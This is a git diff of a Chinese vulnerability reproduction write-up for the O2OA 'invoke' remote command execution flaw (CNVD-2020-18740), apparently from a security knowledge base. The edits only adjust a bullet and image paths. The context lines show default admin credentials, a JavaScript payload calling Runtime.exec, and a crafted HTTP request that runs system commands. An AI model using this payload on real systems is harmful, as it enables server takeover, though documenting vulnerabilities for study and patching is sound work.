@@ -6,7 +6,7 @@ O2OA 是一款开源免费的企业及团队办公平台，提供门户管理、
 
 参考链接：
 
-- https://www.cnvd.org.cn/flaw/show/CNVD-2020-18740
+* https://www.cnvd.org.cn/flaw/show/CNVD-2020-18740
 
 ## 披露时间
 
@@ -34,17 +34,17 @@ cd o2server
 ./start_linux.sh
 ```
 
-![](images/O2OA%20invoke%20后台远程命令执行漏洞%20CNVD-2020-18740/image-20250228143549531.png)
+![](../.gitbook/assets/image-20250228143549531.png)
 
 ## 漏洞复现
 
 默认密码登录后台 `xadmin/o2`（或 `xadmin/o2oa@2022`），点击 `Service Platform` 进入服务平台：
 
-![](images/O2OA%20invoke%20后台远程命令执行漏洞%20CNVD-2020-18740/image-20250228150153382.png)
+![](../.gitbook/assets/image-20250228150153382.png)
 
 点击 `Create Service` 创建一个服务：
 
-![](images/O2OA%20invoke%20后台远程命令执行漏洞%20CNVD-2020-18740/image-20250228150214613.png)
+![](../.gitbook/assets/image-20250228150214613.png)
 
 填写必填项，写入 payload：
 
@@ -61,7 +61,7 @@ var result = { "Result": result };
 this.response.setBody(result, "application/json"); 
 ```
 
-![](images/O2OA%20invoke%20后台远程命令执行漏洞%20CNVD-2020-18740/image-20250228150105054.png)
+![](../.gitbook/assets/image-20250228150105054.png)
 
 部分版本可以直接执行，有些版本需要构造请求包：
 
@@ -81,7 +81,7 @@ Content-Length: 1048
 {"id":"test","name":"test","enableToken":false,"alias":"","description":"","validated":true,"enable":true,"text":"var bufReader = new java.io.BufferedReader(new java.io.InputStreamReader(java.lang.Runtime.getRuntime().exec(\"id\").getInputStream()));\n\nvar result = [];\nwhile (true) {\n    var oneline = bufReader.readLine();\n    result.push(oneline);\n    if (!oneline) break;\n}\nvar result = { \"Result\": result };\nthis.response.setBody(result, \"application/json\"); ","remoteAddrRegex":"","createTime":"2025-02-28 15:54:17","updateTime":"2025-02-28 15:54:17"}
 ```
 
-![](images/O2OA%20invoke%20后台远程命令执行漏洞%20CNVD-2020-18740/image-20250228160252832.png)
+![](../.gitbook/assets/image-20250228160252832.png)
 
 创建成功后访问接口执行系统命令：
 
@@ -98,7 +98,7 @@ authorization: PfyuxmzgIzrLF0IUhEF-rgO3PHNy_z4650QnO7mEHhA
 Content-Length: 1048
 ```
 
-![](images/O2OA%20invoke%20后台远程命令执行漏洞%20CNVD-2020-18740/image-20250228160439089.png)
+![](../.gitbook/assets/image-20250228160439089.png)
 
 ## 漏洞修复
 
